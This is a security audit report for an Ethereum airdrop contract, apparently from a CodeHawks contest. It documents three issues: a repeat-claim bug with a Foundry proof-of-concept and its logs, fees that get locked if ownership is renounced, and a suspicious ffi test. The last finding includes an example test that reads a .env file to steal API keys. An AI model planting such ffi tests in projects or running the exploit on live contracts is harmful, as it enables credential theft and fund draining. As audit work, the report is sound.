# First Flight #14: AirDropper - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. The airdrop can be claimed multiple times, potentially draining contract](#H-01)

- ## Low Risk Findings
    - ### [L-01. Collected fees are permanently stuck inside the MerkleAirdrop.sol contract if ownership is renounced without transfering](#L-01)
    - ### [L-02. Potentially Malicious test in the testing suite](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #14

### Dates: Apr 25th, 2024 - May 2nd, 2024

[See more contest details here](https://www.codehawks.com/contests/clvb821kr0001jzdbi6ggixb0)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 1
   - Medium: 0
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. The airdrop can be claimed multiple times, potentially draining contract            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-04-airdropper/blob/781cf225664a4ad11e9654aaa39cc528016bf214/src/MerkleAirdrop.sol#L30

## Summary
The MerkleAirdrop.sol contract does not contain any mechanism to keep track of whether an address has already claimed the airdrop. This means that any of the whitelisted users can choose to continuously call the claim() function. The contract requires a certain fee to be paid to be able to claim the airdrop. If the value of the airdrop is greater than the value of the fee, a whitelisted user has an arbitrage incentive to continuously call the claim() function until the contract is drained.  

## Vulnerability Details
Here is a proof of concept of a whitelisted user claiming the airdrop multiple times : 

    function testUsersCanClaimMultiple() public {
        uint256 startingBalance = token.balanceOf(collectorOne);
        console.log("Starting Balance : ", startingBalance);
        vm.deal(collectorOne, airdrop.getFee());

        vm.startPrank(collectorOne);
        airdrop.claim{ value: airdrop.getFee() }(collectorOne, amountToCollect, proof);
        vm.stopPrank();

        uint256 endingBalance1 = token.balanceOf(collectorOne);
        assertEq(endingBalance1 - startingBalance, amountToCollect);
        console.log("Ending Balance First Claim: ", endingBalance1);

        vm.deal(collectorOne, airdrop.getFee());
        vm.startPrank(collectorOne);
        airdrop.claim{ value: airdrop.getFee() }(collectorOne, amountToCollect, proof);
        vm.stopPrank();
        uint256 endingBalance2 = token.balanceOf(collectorOne);
        console.log("Ending Balance Second Claim : ", endingBalance2);
        assert(endingBalance1 < endingBalance2);

        vm.deal(collectorOne, airdrop.getFee());
        vm.startPrank(collectorOne);
        airdrop.claim{ value: airdrop.getFee() }(collectorOne, amountToCollect, proof);
        vm.stopPrank();

        uint256 endingBalance3 = token.balanceOf(collectorOne);
        console.log("Ending Balance Third Claim : ", endingBalance3);
        assert(endingBalance2 < endingBalance3);
    }

Here are the returned logs : 
Logs:
  Starting Balance :  0
  Ending Balance First Claim:  25000000
  Ending Balance Second Claim :  50000000
  Ending Balance Third Claim :  75000000
## Impact
The contract could be drained of the airdrop token.

## Tools Used
Foundry

## Recommendations
Include some mechanism to keep track of whether an address has already claimed the airdrop in the past. For reference, here is how Uniswap's MerkleDistributor.sol keeps track of previous claims. 

    // This is a packed array of booleans.
    mapping(uint256 => uint256) private claimedBitMap;

    function isClaimed(uint256 index) public view override returns (bool) {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        uint256 claimedWord = claimedBitMap[claimedWordIndex];
        uint256 mask = (1 << claimedBitIndex);
        return claimedWord & mask == mask;
    }

    function _setClaimed(uint256 index) private {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        claimedBitMap[claimedWordIndex] = claimedBitMap[claimedWordIndex] | (1 << claimedBitIndex);
    }
		


# Low Risk Findings

## <a id='L-01'></a>L-01. Collected fees are permanently stuck inside the MerkleAirdrop.sol contract if ownership is renounced without transfering            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-04-airdropper/blob/781cf225664a4ad11e9654aaa39cc528016bf214/src/MerkleAirdrop.sol#L8

## Summary
MerkleAirdrop.sol inherits from Openzeppelin's Ownable.sol contract. The MerkleAirdrop.sol collects eth from users when they call the claim() function, and then transfers them to the owner using the claimFees() function. The function claimFees() is only callable by the owner of the contract. However, Ownable.sol has a function called renounceOwnership() which if called transfers the ownership of the contract to address(0). If this function were to be called, the owner of the MerkleAirdrop.sol contract will become the 0 address and the function claimFees() will no longer be callable. If this were to happen, then all the ether stored in the MerkleAirdrop.sol contract will be trapped with no way to be moved. 

## Vulnerability Details
The function claimFees() is utilizes the onlyOwner modifier : 

    function claimFees() external onlyOwner {
        (bool succ,) = payable(owner()).call{ value: address(this).balance }("");
        if (!succ) {
            revert MerkleAirdrop__TransferFailed();
        }
    }

However, Ownable.sol has a renounceOwnership() function which can allow the owner to transfer ownership to address(0).

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

## Impact
If renounceOwnership() were to be called, all the ether collected from the fees would be trapped in the contract with no way to retrieve it. 

## Tools Used
Manual Review

## Recommendations
Override the renounceOwnership() function so that it reverts every time it is called. 
## <a id='L-02'></a>L-02. Potentially Malicious test in the testing suite            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-04-airdropper/blob/781cf225664a4ad11e9654aaa39cc528016bf214/test/MerkleAirdropTest.t.sol#L41

## Summary
In foundry, ffi is used to call arbitrary commands. The foundry documentation states "It is generally advised to use this cheat code as a last resort, and to not enable it by default, as anyone who can change the tests of a project will be able to execute arbitrary commands on devices that run the tests."

The testing suite provided for this project includes a test called testPwned() which is uses the ffi command to create a file within the user's system.

## Vulnerability Details
Here is the testPwned() function included in the file MerkleAirdropTest.t.sol : 

    function testPwned() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = string.concat("youve-been-pwned");
        cheatCodes.ffi(cmds);
    }
The test uses the ffi command to create a file called "youve-been-pwned" on the user's system. 

## Impact
The test is currently harmless, as all it does is create an empty file called "youve-been-pwned." However, ffi commands should not be included in the testing suite. The same commands can be used to perform malicious operations. For example, here is a foundry test which will read in all of the environment variables in a users directory. Such tests could be used to steal API keys since it is very common to use RPC providers when running tests of more complex protocols meant to be used in production. 

    function testStealKeys() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "cat";
        cmds[1] = ".env";
        bytes memory res = cheatCodes.ffi(cmds);
        console.log(string(res));

        //make post request with the api key
    }

## Tools Used
Foundry

## Recommendations
Delete testPwned() from MerkleAirdropTest.t.sol 


